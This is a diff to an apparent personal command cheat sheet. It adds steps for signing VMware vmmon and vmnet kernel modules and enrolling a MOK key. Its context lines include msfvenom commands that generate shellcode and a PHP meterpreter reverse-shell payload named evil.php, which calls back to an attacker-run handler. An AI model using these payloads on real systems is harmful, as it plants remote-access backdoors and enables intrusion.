@@ -8,7 +8,7 @@
  
  https://gist.github.com  
 
- // Payloads with msfvenom - Linux  
+ // Payloads with msfvenom - Linux
 
      msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o shellcode.bin  
      msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip of multi/handler> LPORT=4444 -f raw -o evil.php  
@@ -243,6 +243,29 @@
  // Unzip a disc image - Linux
  
      unxz -v <Path to image>.img.xz  
+
+ // VMware Linux "Cannot open /dev/vmmon: No such file or directory"  
+ 
+Generate key pair using openssl to sign vmmon and vmnet modules:  
+
+```
+openssl req -new -x509 -newkey rsa:2048 -keyout MOK.priv -outform DER -out MOK.der -nodes -days 36500 -subj "/CN=VMware/"
+```
+
+Sign modules using generated key:
+```
+/usr/src/linux-headers-`uname -r`/scripts/sign-file sha256 ./MOK.priv ./MOK.der $(modinfo -n vmmon)
+
+/usr/src/linux-headers-`uname -r`/scripts/sign-file sha256 ./MOK.priv ./MOK.der $(modinfo -n vmnet)
+```
+
+Import public key to system's MOK list:  
+```
+$mokutil --import MOK.der
+``` 
+Create password for this MOK enrollment request.
+Reboot. Follow instructions to complete the MOK enrollment from UEFI console.
+
 
 # Nmap notes  
 
